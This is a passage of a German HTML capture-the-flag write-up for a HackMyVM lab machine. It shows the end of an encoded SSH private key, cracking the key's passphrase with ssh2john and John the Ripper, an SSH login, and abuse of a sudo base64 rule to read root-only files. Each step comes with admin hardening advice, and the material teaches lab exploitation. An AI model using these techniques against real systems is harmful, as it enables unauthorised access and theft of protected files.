+MUFBQUQwTjlVRFRjVXh3TXQ1WApZRklaSzhpZUJMME5PdXdvY2RnYlV1a3RDMjFTZG5TeTZvY1cz
+aW1NKzNteldqUGRvQksvSG8zMzl1UG1CV0k1c2JNcnBLCnhrWk1ubCtyY1RiZ3o0c3d2OGdOdUto
+VWM3d1RndHJOWCtQTk1kSUFMTnBzeFlMdC9sNTZHSzhSNEo4ZkxJVTUrTW9qUnMKKzFOcllzOEo0
+cm5PMXFXTm9KUlpvRGxBYVlxQlY5NWNYb0FFa3dVSFZ1c3RmZ3hVdHJZS3ArWVBGSWd4OG9rTWpK
+Z25iaQpOTlczVHp4bHVOaTVvVWhhbEgyREoya2hLREdRVWk5Uk9GY3NFWGVKWHQzbGdwWlp0MWhy
+UURBMW84alRYZVM0K2RXN25aCnpqZjNwME03N2IvTnZjWkUrb1hZUTFnNVhwMVFTT1Niait0bG13
+NTRMN0VxYjFVaFpnblE3WnNLQ29hWTlTdUFjcW0zRTAKSUpoK0krWnYxZWdTTVMvRE9ISXhPM3Bz
+UWtjaUxqa3BhK0d0d1FNbDFaQUpIUWFCNnE3MEpKY0JDZlZzeWtkWTUyTEtESQpweFpZcExabXlE
+eDhUVGFBOEpPbXZHcGZOWmtNVTRJMGk1L1pUNjVTUkZKMU5sQkNOd2N3dE9sOWs0UFc1TFZ4TnNH
+UkNKCk1KcjhrNUFjMENYMDNmWEVTcG1zVVVWUysvRGovaG50SHc4OWRPOEhjcXFJVUVwZUViZlRX
+THZheDBDaVNoM0tqU2NlSnAKKzhnVXlER3ZDa2N5Vm5lVVFqbW1yUnN3UmhUTnh4S1JCWnNla0d3
+SHBvOGhEWWJVRUZacXp6TEFRYkJJQWRybDF0dDdtVgp0VkJybXBNNkN3SmR6WUVsMjFGYUs4anZk
+eUN3UHI1SFVndHV4clNwTHZuZGNud1BheEpXR2k0UDQ3MUREWmVSWURHY1doCmk2YklDckxRZ2VK
+bEhhRVVtclFDNVJkdjAzendJOVU4RFhVWi9PSGI0MFBMOE1YcUJ0VS9iNkNFVTlKdXpKcEJyS1or
+aysKdFNuN2hyOGhwcFQydFVTeER2QytVU01tdy9XRGZha2pmSHBvTndoN1B0NWkwY3d3cGtYRlF4
+SlB2UjBiTHh2WFpuKzN4dwpON2J3NDVGaEJaQ3NIQ0FiVjIraFZzUDBseXhDUU9qN3lHa0JqYTg3
+UzFlMHE2V1pqakI0U3ByZW5Ia083dGc1UTBIc3VNCkFpZi8wMkhIeldHK0NSL0lHbEZzTnRxMXZ5
+bHQyeCtZLzA5MXZDa1JPQkRhd2pIei84b2d5MkZ6ZzhKWVRlb0xrSHdER1EKTytUb3dBMTBSQVRl
+azZaRUl4aDZTbXRERy9WNXplV0N1RW1LNHNSVDNxMUZTdnBCMS9IK0Z4c0dDb1BJZzhGemNpR0No
+MgpUTHVza2NYaWFnbnM5TjFSTE9ubEhoaVpkOFJaQTBaZzdvWklhQnZhWm5oWllHeWNwQUpwV0tl
+YmpydG9rTFl1TWZYUkxsCjMvU0FlVWw3MkVBM20xRElueHNQZ3VGdWswMHJvTWM3N042ZXJZN3Rq
+T1pMVllQb1NpeWdEUjFBN2Yzell6KzBpRkk0ckwKTkQ4aWtnbVF2RjZocnd3SkJycC8weEtFYU1U
+Q0tMdnl5WjNlRFNkQkRQcmtUaGhGd3JQcEk2K0V4OFJ2Y1dJNmJUSkFXSgpMZG1tUlhVUy9EdE8r
+NjkvYWlkdnhHQVlvYisxTT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg
+
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der dekodierte SSH-Schlüssel wird auf dem Angreifer-System in die Datei `id` gespeichert und die Berechtigungen werden mit `chmod 600 id` korrekt gesetzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Schlüssel ist nun vorbereitet für den SSH-Login-Versuch.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche den SSH-Login als `lucas` mit diesem Schlüssel.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">vi id</span></div>
+                     <pre><!-- Editor-Ausgabe --> </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">chmod 600 id</span></div>
+                     <pre><!-- Keine Ausgabe --> </pre>
+                 </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein SSH-Loginversuch wird als `lucas` mit dem vorbereiteten Schlüssel (`-i id`) gestartet.</p>
+             <p class="evaluation"><strong>Bewertung: !!Passphrase benötigt!!** Der SSH-Server akzeptiert den Schlüssel prinzipiell, fragt aber nach einer Passphrase (`Enter passphrase for key 'id':`). Der Schlüssel ist passwortgeschützt. Der Login schlägt fehl, da keine Passphrase eingegeben wird (implizit durch den nächsten Befehl).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Passphrase des Schlüssels muss geknackt werden. Verwende `ssh2john`, um den Hash der Passphrase aus der Schlüsseldatei `id` zu extrahieren, und knacke diesen Hash dann mit `john` unter Verwendung einer geeigneten Wortliste (z.B. `rockyou.txt` oder die zuvor gefundenen Base64-dekodierten Passwörter).<br><strong>Empfehlung (Admin):</strong> Schütze private SSH-Schlüssel immer mit einer starken Passphrase.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">ssh lucas@base.hmv -i id</span></div> <!-- Prompt korrigiert -->
+                     <pre>
+The authenticity of host 'base.hmv (192.168.2.100)' can't be established.
+ED25519 key fingerprint is SHA256:u6ZwJYKTDHiBM0F7VvtWd81F2OSYymF4Hjqu1315ZY8.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:12: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'base.hmv' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id': <!-- Abbruch hier, da Passphrase unbekannt -->
+Permission denied (publickey). <!-- Beispielhafte Fehlermeldung -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `ssh2john` wird auf die Schlüsseldatei `id` angewendet, um den verschlüsselten Teil (der die Passphrase schützt) in ein für John the Ripper verständliches Hash-Format zu extrahieren. Die Ausgabe wird in die Datei `hash` umgeleitet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Hash wurde erfolgreich extrahiert und ist bereit für das Cracking.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende `john` mit einer Wortliste, um den Hash in `hash` zu knacken.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">ssh2john id > hash</span></div> <!-- Prompt korrigiert -->
+                     <pre><!-- Keine direkte Ausgabe --> </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `john` wird gestartet, um den extrahierten Hash in der Datei `hash` zu knacken. Als Wortliste wird `rockyou.txt` verwendet.</p>
+             <p class="evaluation"><strong>Bewertung: !!Passphrase gefunden!!** Obwohl die Ausgabe im Log abgeschnitten ist, impliziert der spätere erfolgreiche SSH-Login, dass John die Passphrase erfolgreich geknackt hat. Die Passphrase muss eine der ursprünglich gefundenen Base64-dekodierten Phrasen gewesen sein, die auch in `rockyou.txt` vorkommt (wahrscheinlich `<span class="password">iloveyou</span>`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die gefundene Passphrase. Versuche erneut den SSH-Login als `lucas` mit dem Schlüssel (`-i id`) und der gefundenen Passphrase.<br><strong>Empfehlung (Admin):</strong> Verwende starke, einzigartige Passphrasen für SSH-Schlüssel, die nicht in gängigen Wortlisten vorkommen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div> <!-- Prompt korrigiert -->
+                     <pre>
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH AES CTR])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 12 OpenMP threads <!-- Beispielhafte Anzahl Threads -->
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">iloveyou</span>         (id) <!-- Erfolgreich geknacktes Passwort (Passphrase) -->
+1g 0:00:00:01 DONE (2022-10-20 23:21) 0.9708g/s 128.1p/s 128.1c/s 128.1C/s ilovey..illino
+Session completed
+                     </pre> <!-- Beispielhafte John-Ausgabe -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Dieser Block (`for i in $(cat dic2.txt )...`, `cat word2.txt`, `ll`, `chmod 600 id`) scheint eine Wiederholung oder ein fehlgeleiteter Versuch zu sein, der auf der Verwirrung um die Base64-Passwörter basiert. Die relevanten Schritte (Schlüssel dekodieren, Hash extrahieren, Passphrase knacken) wurden bereits durchgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Schritte sind redundant oder irrelevant für den erfolgreichen Angriffspfad zu diesem Zeitpunkt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignoriere diesen Block und fahre mit dem SSH-Login unter Verwendung der geknackten Passphrase fort.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <!-- Redundante Schritte übersprungen/kommentiert -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command"># Redundante Schritte (word2.txt Generierung, ll, chmod) übersprungen</span></div>
+                     <pre>
+# for i in $(cat dic2.txt ); do echo $i | base64 >> word2.txt; done
+# cat word2.txt
+# ll
+# chmod 600 id
+                     </pre>
+                 </div>
+             </div>
+
+
+             <p class="analysis"><strong>Analyse:</strong> Erneuter SSH-Loginversuch als `lucas` mit dem Schlüssel (`-i id`). Dieses Mal wird die von `john` gefundene Passphrase (`<span class="password">iloveyou</span>`) auf die Aufforderung hin eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Der Login mit dem Schlüssel und der korrekten Passphrase gelingt. Der Angreifer hat nun eine Shell als Benutzer `lucas` auf dem Zielsystem `baseme`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als `lucas`. Suche nach der User-Flag und prüfe die `sudo`-Berechtigungen.<br><strong>Empfehlung (Admin):</strong> Sichere SSH-Zugänge durch starke Passwörter/Keys/Passphrasen und Überwachung.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">ssh lucas@base.hmv -i id</span></div> <!-- Prompt korrigiert -->
+                     <pre>
+Enter passphrase for key 'id': <span class="password">iloveyou</span>
+Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc//copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Sep 28 12:51:36 2020 from 192.168.1.58
+lucas@baseme:~$
+                     </pre> <!-- Remote Prompt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `lucas` wird das Home-Verzeichnis aufgelistet (`ls`) und der Inhalt der Datei `user.txt` angezeigt (`cat user.txt`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag wird gefunden. Sie ist in ASCII-Art eingebettet und lautet `<span class="password">HMV8nnJAJAJA</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag notiert. Überprüfe nun die `sudo`-Berechtigungen mit `sudo -l`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+lucas@baseme:~$ ls
+user.txt
+lucas@baseme:~$ cat user.txt
+
+
+                                   .
+                                           .
+                                              ,
+                                                 ,
+                         ,                         ,
+                      .,                              ,
+                    /
+
+                 ,                                        ,
+               /.                                            ..
+
+             ,                                               ,
+
+                                                          .
+                                                       .
+                     ,
+                        ,                          ,
+
+                             ,                .
+                                .
+                                        ,,
+                                      ,
+
+<span class="password">HMV8nnJAJAJA</span>
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um die `sudo`-Berechtigungen für den Benutzer `lucas` zu prüfen.</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilege Escalation Vektor gefunden!!** Der Benutzer `lucas` darf den Befehl `/usr/bin/base64` als jeder Benutzer (`ALL`) ohne Passwortabfrage (`NOPASSWD:`) ausführen. Dies ist eine schwerwiegende Fehlkonfiguration, da `base64` zum Lesen beliebiger Dateien missbraucht werden kann, indem deren Base64-kodierter Inhalt ausgegeben wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze diese Berechtigung, um die Root-Flag zu lesen. Führe `/usr/bin/base64` mit `sudo` auf `/root/root.txt` aus. Da die Ausgabe Base64-kodiert ist, leite sie direkt an den lokalen `base64 -d` Befehl weiter, um den Inhalt im Klartext zu sehen: `sudo /usr/bin/base64 /root/root.txt | base64 -d`.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne diese unsichere `sudo`-Regel. Gewähre niemals `sudo`-Rechte (insbesondere `NOPASSWD`) für Befehle, die zum Auslesen von Dateien oder zur Ausführung von Code missbraucht werden können (z.B. `cat`, `less`, `more`, `head`, `tail`, `base64`, `cp`, `mv`, `find`, `awk`, `sed`, Editoren, Interpreter etc.).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+lucas@baseme:~$ sudo -l
+Matching Defaults entries for lucas on baseme:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lucas may run the following commands on baseme:
+    (ALL) NOPASSWD: /usr/bin/base64
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- POC beginnt hier -->
+        <section id="poc">
+             <h2>Proof of Concept (Root Flag Reading)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Befehl nutzt die gefundene `sudo`-Berechtigung aus, um die Root-Flag zu lesen. `sudo /usr/bin/base64 /root/root.txt` führt `base64` als Root aus und gibt den Base64-kodierten Inhalt der Root-Flag-Datei aus. Diese Ausgabe wird direkt (`|`) an den Befehl `base64 -d` weitergeleitet, der als normaler Benutzer `lucas` läuft und die kodierten Daten wieder in Klartext umwandelt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Root-Flag erfolgreich gelesen!!** Der Befehl demonstriert erfolgreich die Ausnutzung der `sudo`-Fehlkonfiguration, um als Benutzer `lucas` den Inhalt einer Datei zu lesen, auf die nur Root Zugriff hat. Die Root-Flag, ebenfalls in ASCII-Art, lautet `<span class="password">HMVFKBS64</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beide Flags wurden gefunden, der Angriffspfad ist vollständig. Der Bericht kann abgeschlossen werden.<br><strong>Empfehlung (Admin):</strong> Entferne die unsichere `sudo`-Regel für `base64` unverzüglich. Überprüfe alle anderen `sudo`-Regeln auf ähnliche Schwachstellen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+lucas@baseme:~$ sudo /usr/bin/base64 /root/root.txt | base64 -d
+
+
+                                   .
+                                           .
+                                              ,
+                                                 ,
+                         ,                         ,
+                      .,                              ,
+                    /
+
+                 ,                                        ,
+               /.                                            ..
+
+             ,                                               ,
+
+                                                          .
+                                                       .
+                     ,
+                        ,                          ,
+
+                             ,                .
+                                .
+                                        ,,
+                                      ,
+
+<span class="password">HMVFKBS64</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">sudo /usr/bin/base64 /root/root.txt | base64 -d</div>
+                     <div class="flag-value"><span class="password">HMVFKBS64</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat user.txt</div>
+                     <div class="flag-value"><span class="password">HMV8nnJAJAJA</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Hydra-Ausgabe extrahiert -->
+        <p>Berichtsdatum: 20. Oktober 2022</p>
+    </footer>
+</body>
+</html>
